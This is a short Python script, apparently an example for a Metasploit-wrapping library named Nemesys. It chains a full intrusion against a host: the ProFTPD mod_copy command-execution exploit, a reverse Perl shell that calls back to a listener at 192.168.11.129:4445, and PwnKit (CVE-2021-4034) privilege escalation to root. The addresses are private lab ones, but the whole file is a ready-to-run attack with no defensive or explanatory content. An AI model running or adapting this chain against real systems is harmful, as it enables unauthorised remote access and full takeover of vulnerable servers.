from nemesys.nemesys import Nemesys


def main():
    client = Nemesys("password")

    exploit_name = "unix/ftp/proftpd_modcopy_exec"
    payload_name = "cmd/unix/reverse_perl"
    exploit_options = {
        'RHOSTS': '192.168.11.128',
        'SITEPATH': '/var/www/html'
    }
    payload_options = {
        'LHOST': '192.168.11.129',
        'LPORT': 4445
    }

    # privilege escalation using PwnKit (CVE-2021-4034)
    privilege_escalation_exploit = "linux/local/cve_2021_4034_pwnkit_lpe_pkexec"
    target = "192.168.11.128"

    client.run_attack(
        exploit_name=exploit_name,
        payload_name=payload_name,
        exploit_options=exploit_options,
        payload_options=payload_options,
        privilege_escalation_exploit=privilege_escalation_exploit,
        target=target
    )

if __name__ == "__main__":
    main()